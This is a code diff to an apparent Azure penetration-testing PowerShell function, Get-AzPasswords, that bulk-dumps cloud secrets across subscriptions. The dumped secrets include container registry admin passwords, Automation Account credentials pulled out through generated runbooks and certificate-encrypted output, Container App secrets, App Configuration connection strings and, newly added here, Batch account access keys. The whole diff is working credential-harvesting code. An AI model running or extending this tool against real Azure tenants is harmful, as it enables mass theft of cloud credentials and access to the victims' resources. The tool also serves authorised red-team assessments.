@@ -5,12 +5,6 @@
 #>
 
 
-# Check if the Az Module is installed and imported
-if(!(Get-Module Az)){
-    try{Import-Module Az -ErrorAction Stop}
-    catch{Install-Module -Name Az -Confirm}
-    }
-
 
 Function Get-AzPasswords
 {
@@ -127,6 +121,11 @@ Function Get-AzPasswords
         HelpMessage="Dump App Configuration Access keys.")]
         [ValidateSet("Y","N")]
         [String]$AppConfiguration = "Y",
+
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump Batch Account Access keys.")]
+        [ValidateSet("Y","N")]
+        [String]$BatchAccounts = "Y",
                 
         [parameter(Mandatory=$false,
         HelpMessage="Export the AKS kubeconfigs to local files.")]
@@ -163,7 +162,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus -AppConfiguration $AppConfiguration}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -FunctionApps $FunctionApps -ExportKube $ExportKube -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB -AKS $AKS -ContainerApps $ContainerApps -APIManagement $APIManagement -ServiceBus $ServiceBus -AppConfiguration $AppConfiguration -BatchAccounts $BatchAccounts -TestPane $TestPane}
         break
     }
 
@@ -502,13 +501,16 @@ Function Get-AzPasswords
         Write-Verbose "Getting List of Azure Container Registries..."
         $registries = Get-AzContainerRegistry
         $registries | ForEach-Object {
-            if ($_.AdminUserEnabled -eq 'True'){
-                
+           if ($_.AdminUserEnabled -eq 'True'){
+                try{
                 $loginServer = $_.LoginServer
+                $name = $_.Name
                 Write-Verbose "`tGetting the Admin User password for $loginServer"
-                $ACRpasswords = Get-AzContainerRegistryCredential -ResourceGroupName $_.ResourceGroupName -Name $_.Name
+                $ACRpasswords = Get-AzContainerRegistryCredential -ResourceGroupName $_.ResourceGroupName -Name $name
                 $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                 $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                }
+                catch{Write-Verbose "`tuser does not have authorization to perform action Get-AzContainerRegistryCredential for container registry $name"}
             }
         }
     }
@@ -593,6 +595,7 @@ Function Get-AzPasswords
                         "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
 
                         # Copy the B64 encryption cert to the Automation Account host
+                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
@@ -641,6 +644,7 @@ Function Get-AzPasswords
                         "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
 
                         # Copy the B64 encryption cert to the Automation Account host
+                        "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                         "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
@@ -667,7 +671,8 @@ Function Get-AzPasswords
                     $dumpMI = $true
                     $dumpMiJobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                     # Copy the B64 encryption cert to the Automation Account host
-                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
+                    "New-Item -ItemType Directory -Force -Path `"C:\Temp`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1"
+                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -Append -FilePath "$pwd\$dumpMiJobName.ps1"
                     "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                     "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$dumpMiJobName.ps1" -Append
                     #Request a token from the IMDS
@@ -823,6 +828,9 @@ Function Get-AzPasswords
                                 
                                             # Might be able to delete this line...
                                             if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
+
+                                            # Select only lines containing the protected content (skip eventual debug output)
+                                            $jobOutput = $jobOutput | Where-Object { $_.value -match "-----BEGIN CMS-----" }
         
                                             # Decrypt the output and add it to the table
                                             $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
@@ -1107,7 +1115,7 @@ Function Get-AzPasswords
         $rgList | ForEach-Object {
 
             # Get list of Container Apps
-            $CAListURL = "https://management.azure.com/subscriptions/$subID/resourceGroups/$($_.name)/providers/Microsoft.App/containerApps/?api-version=2022-01-01-preview"
+            $CAListURL = "https://management.azure.com/subscriptions/$subID/resourceGroups/$($_.name)/providers/Microsoft.App/containerApps/?api-version=2022-03-01"
             $CAList = ((Invoke-WebRequest -UseBasicParsing -Uri $CAListURL -Headers @{ Authorization ="Bearer $CAmanagementToken"} -Method GET -Verbose:$false).Content | ConvertFrom-Json).value
 
             if ($CAList -ne $null){                
@@ -1115,7 +1123,7 @@ Function Get-AzPasswords
                 $CAList | ForEach-Object{
                     $CAName = ($_.id).split("/")[-1]
                     Write-Verbose "`tGetting Container App Secrets from the $CAName application"
-                    $secretsURL = "https://management.azure.com$($_.id)/listSecrets?api-version=2022-01-01-preview"
+                    $secretsURL = "https://management.azure.com$($_.id)/listSecrets?api-version=2022-03-01"
                     $CASecrets = ((Invoke-WebRequest -UseBasicParsing -Uri $secretsURL -Headers @{ Authorization ="Bearer $CAmanagementToken"; 'Content-Type' = "application/json"} -Method POST -Verbose:$false).Content | ConvertFrom-Json).value
 
                     # Add the Secrets to the output table
@@ -1177,7 +1185,8 @@ Function Get-AzPasswords
     }
 
     # App Configuration Keys Section
-    if ($AppConfiguration){
+    if ($AppConfiguration -eq 'Y'){
+        Write-Verbose "Getting List of App Configuration Stores"
         $configStores = Get-AzAppConfigurationStore
         $configStores | ForEach-Object {
             $configRG = ($_.Id).Split('/')[4]
@@ -1187,6 +1196,27 @@ Function Get-AzPasswords
                 # Add the Secrets to the output table
                 $TempTblCreds.Rows.Add("App Configuration Access Key",-join($AppConfigName,"-",$_.Name),"Connection String",$_.ConnectionString,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
             }
+        }
+    }
+
+
+    # Batch Account Access Keys Section
+    if ($BatchAccounts -eq 'Y'){
+
+        Write-Verbose "Getting List of Azure Batch Accounts"
+
+        #Get list of Batch Accounts
+        $batchAccountList = Get-AzBatchAccount
+
+        $batchAccountList | ForEach-Object{
+            # Get Account Keys
+            Try{
+            $batchKeys = Get-AzBatchAccountKeys -AccountName $_.AccountName
+                # Add the Secrets to the output table
+                $TempTblCreds.Rows.Add("Batch Access Key",$_.AccountName,"Primary",$batchKeys.PrimaryAccountKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                $TempTblCreds.Rows.Add("Batch Access Key",$_.AccountName,"Secondary",$batchKeys.SecondaryAccountKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+            }
+            Catch{Write-Verbose "`tNo ListKeys Permissions on the $($_.AccountName) Batch Account"}
         }
     }
 
